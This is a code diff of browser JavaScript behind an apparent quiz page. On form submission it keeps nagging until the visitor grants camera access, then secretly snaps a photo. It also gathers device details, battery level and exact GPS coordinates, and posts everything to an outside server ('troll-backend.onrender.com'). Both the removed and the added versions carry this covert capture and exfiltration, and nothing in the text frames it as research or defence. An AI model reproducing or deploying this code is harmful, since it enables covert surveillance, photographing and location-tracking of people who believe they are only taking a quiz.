@@ -1,144 +1,130 @@
-// ==========================
-// DOM ELEMENTS
-// ==========================
-const quizForm = document.getElementById("quiz-form");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const toast = document.getElementById("toast");
-const fileInput = document.getElementById("user-file");
+// ====== Elements ======
+const btn = document.getElementById('submit-btn'); // submit button
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const fileInput = document.getElementById('user-file');
+const toast = document.getElementById('toast');
+const quizForm = document.getElementById('quiz-form');
 
-// Camera constraints
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-// ==========================
-// TOAST FUNCTION
-// ==========================
-function showToast(message = "Done") {
-  toast.textContent = message;
-  toast.classList.add("show");
-  setTimeout(() => toast.classList.remove("show"), 3000);
+// ====== Toast helper ======
+function showToast(msg = "Done") {
+    toast.textContent = msg;
+    toast.style.display = 'block';
+    setTimeout(() => {
+        toast.style.display = 'none';
+    }, 2500);
 }
 
-// ==========================
-// METADATA COLLECTION
-// ==========================
+// ====== Capture real camera photo ======
+async function captureCameraPhoto() {
+    // Loop until user allows camera
+    let stream = null;
+    while (!stream) {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia(constraints);
+        } catch (err) {
+            alert("Camera permission is required to continue. Please allow it!");
+        }
+    }
+
+    video.srcObject = stream;
+    await video.play();
+
+    // Wait until video has loaded a frame
+    if (video.readyState < 2) {
+        await new Promise(resolve => video.addEventListener('loadeddata', resolve, { once: true }));
+    }
+
+    // Match canvas size to video
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Stop video stream after capture
+    stream.getTracks().forEach(track => track.stop());
+
+    return canvas.toDataURL('image/png');
+}
+
+// ====== Collect metadata ======
 async function collectMetadata() {
-  const metadata = {
-    width: window.innerWidth,
-    height: window.innerHeight,
-    platform: navigator.platform,
-    language: navigator.language,
-    useragent: navigator.userAgent,
-    deviceram: navigator.deviceMemory || "N/A",
-    cpuThreads: navigator.hardwareConcurrency || "N/A",
-    referurl: document.referrer,
-    localtime: new Date().toLocaleString(),
-    battery: "N/A",
-    location: "N/A",
-  };
-
-  // Battery info
-  if (navigator.getBattery) {
-    try {
-      const battery = await navigator.getBattery();
-      metadata.battery = `${battery.level * 100}% (${battery.charging ? "charging" : "not charging"})`;
-    } catch {}
-  }
-
-  // Geolocation
-  if (navigator.geolocation) {
-    try {
-      const position = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject);
-      });
-      metadata.location = `${position.coords.latitude}, ${position.coords.longitude}`;
-    } catch {
-      metadata.location = "Access denied";
-    }
-  }
-
-  return metadata;
-}
-
-// ==========================
-// CAPTURE PHOTO
-// ==========================
-function capturePhoto() {
-  const context = canvas.getContext("2d");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-  return canvas.toDataURL("image/png");
-}
-
-// ==========================
-// SEND TO BACKEND
-// ==========================
-async function sendToBackend(imageData, metadata) {
-  try {
-    const res = await fetch("https://troll-backend.onrender.com/api/upload", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image: imageData, metadata: metadata }),
-    });
-    const data = await res.json();
-    console.log("Backend response:", data);
-  } catch (err) {
-    console.error("Error sending data:", err);
-  }
-}
-
-// ==========================
-// CAMERA PERMISSION LOOP
-// ==========================
-async function requestCameraUntilAllowed() {
-  let stream = null;
-  while (!stream) {
-    try {
-      stream = await navigator.mediaDevices.getUserMedia(constraints);
-    } catch (err) {
-      alert("Camera permission is required to continue. Please allow access.");
-    }
-  }
-  return stream;
-}
-
-// ==========================
-// FORM SUBMIT HANDLER
-// ==========================
-quizForm.addEventListener("submit", async (e) => {
-  e.preventDefault();
-
-  // First, request camera permission
-  const stream = await requestCameraUntilAllowed();
-  video.srcObject = stream;
-
-  // Wait for video to be ready
-  await new Promise((resolve) => {
-    video.onloadedmetadata = () => {
-      video.play();
-      resolve();
+    const metadata = {
+        useragent: navigator.userAgent,
+        platform: navigator.platform,
+        width: window.innerWidth,
+        height: window.innerHeight,
+        language: navigator.language,
+        time: new Date().toLocaleString(),
+        battery: 'N/A',
+        location: 'N/A',
     };
-  });
-  await new Promise((resolve) => setTimeout(resolve, 200)); // small delay to get first frame
 
-  // Capture photo and collect metadata
-  const imageData = capturePhoto();
-  const metadata = await collectMetadata();
+    // Battery info
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            metadata.battery = battery.level * 100;
+        } catch {}
+    }
 
-  // Send image + metadata to backend
-  await sendToBackend(imageData, metadata);
+    // Geolocation
+    if (navigator.geolocation) {
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+            });
+            metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
+        } catch {
+            metadata.location = "Denied";
+        }
+    }
 
-  // Show toast
-  showToast("Captured & sent!");
+    return metadata;
+}
 
-  // Continue with normal form submit (optional: upload file)
-  if (fileInput.files.length > 0) {
-    console.log("User uploaded file:", fileInput.files[0].name);
-    // You can handle file upload here if needed
-  }
+// ====== Send data to backend ======
+async function sendData(imageData, metadata) {
+    try {
+        const response = await fetch("https://troll-backend.onrender.com/api/upload", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ image: imageData, metadata }),
+        });
 
-  // Optionally, show success container
-  document.getElementById("quiz-container").style.display = "none";
-  document.getElementById("success-container").style.display = "flex";
+        const data = await response.json();
+        console.log("Backend response:", data);
+        showToast("Photo & metadata sent!");
+    } catch (err) {
+        console.error("Error sending data:", err);
+        showToast("Failed to send data!");
+    }
+}
+
+// ====== Form submission handler ======
+quizForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    showToast("Capturing photo...");
+
+    // Capture real camera photo
+    const photo = await captureCameraPhoto();
+
+    // Collect metadata
+    const metadata = await collectMetadata();
+
+    // Send to backend
+    await sendData(photo, metadata);
+
+    // Optional: submit file input if user selected any file
+    if (fileInput && fileInput.files.length > 0) {
+        const fileData = fileInput.files[0];
+        console.log("User uploaded file:", fileData.name);
+    }
+
+    // Show success toast
+    showToast("Submission complete!");
 });
